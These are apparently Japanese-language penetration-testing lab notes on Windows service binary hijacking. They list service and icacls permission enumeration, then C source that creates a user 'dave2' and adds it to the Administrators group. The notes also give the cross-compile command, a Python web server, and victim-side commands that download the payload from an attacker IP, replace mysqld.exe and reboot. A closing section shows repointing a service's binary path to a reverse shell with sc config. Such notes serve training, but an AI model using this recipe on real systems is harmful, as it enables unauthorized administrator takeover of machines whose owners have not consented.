Windowsサービスは、サービス コントロール マネージャーによって管理される、長時間実行されるバックグラウンド実行ファイルまたはアプリケーションであり、Unix システムのデーモンの概念に似ている

# 01_Service Binary Hijacking
各Windowsサービスには関連するバイナリファイルがあります。これらのバイナリファイルは、サービスが開始されたとき、または実行状態に移行したときに実行される

## Service Enum
- GUI snap-in services.msc
- Get-Service Cmdlet
- Get-CimInstance Cmdlet (superseding Get-WmiObject)
```text
※WinRMやバインドシェルなどのネットワークログオンを使用している場合、管理者権限のないユーザーでGet-CimInstanceおよびGet-Serviceを実行すると、サービスへのクエリ時に「アクセスが拒否されました」というエラーが発生します。RDPなどの対話型ログオンを使用すると、この問題は解決します。
```

---
# Usage 1
Kali
```bash
xfreerdp3 /u:"dave" /p:"lab" /v:192.168.236.220 /dynamic-resolution
```

Victim
```powershell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}

Name                         State   PathName
----                         -----   --------
Apache2.4                    Running "C:\xampp\apache\bin\httpd.exe" -k runservice
Appinfo                      Running C:\WINDOWS\system32\svchost.exe -k netsvcs -p

mysql                        Running C:\xampp\mysql\bin\mysqld.exe --defaults-file=c:\xampp\mysql\bin\my.ini mysql
# xamppがCドライブ直下にあることから、サービスがユーザーによってインストールされ、ソフトウェア開発者がディレクトリ構造と権限を管理していることを意味する
```

## サービスバイナリの権限を列挙

### icacls permissions mask

| Mask | Permissions             |
| ---- | ----------------------- |
| F    | Full access             |
| M    | Modify access           |
| RX   | Read and execute access |
| R    | Read-only access        |
| W    | Write-only access       |

```powershell
icacls "C:\xampp\apache\bin\httpd.exe"
# BUILTIN\Users:(RX)

icacls "C:\xampp\mysql\bin\mysqld.exe"
```

## 悪意のあるバイナリの作成
```bash
vi adduser.c
```

adduser.c  
```text
# dave2というユーザーを作成し、 system関数を使ってそのユーザーをローカルのAdministratorsグループに追加するコード
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user dave2 password123! /add");
  i = system ("net localgroup administrators dave2 /add");
  
  return 0;
}
```

### コンパイル
```bash
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```

```bash
python3 -m http.server 80
```

### 実行
Victim
```powershell
iwr -uri http://192.168.45.223/adduser.exe -Outfile adduser.exe

# 既存ファイルの退避
move C:\xampp\mysql\bin\mysqld.exe mysqld.exe

# バイナリの置き換え
move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe

# サービスの停止
net stop mysql

System error 5 has occurred.

Access is denied.
# 権限がないためエラー

# スタートアップタイプの確認
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}

Name  StartMode
----  ---------
mysql Auto

# ユーザの再起動の権限(SeShutDownPrivilege)の確認
whoami /priv

# 再起動の実行
shutdown /r /t 0

# dave2の確認
Get-LocalGroupMember administrators

# RunAsを使って対話型シェルを起動する方法や、msfvenomを使って実行ファイルを作成し、リバースシェルを起動することもできる
```
---
# Usage 2
#winpeas からサービスを識別する
icalcs "path" 
#Fは完全な権限を意味し、フォルダへのフルアクセスがあることを確認する必要があります
```
sc qc <servicename>
```
 #BinaryPath 変数の検索
```cmd
sc config <service> <option>="<value>" 
#change the path to the reverseshell location
```

```cmd
sc start <servicename>
```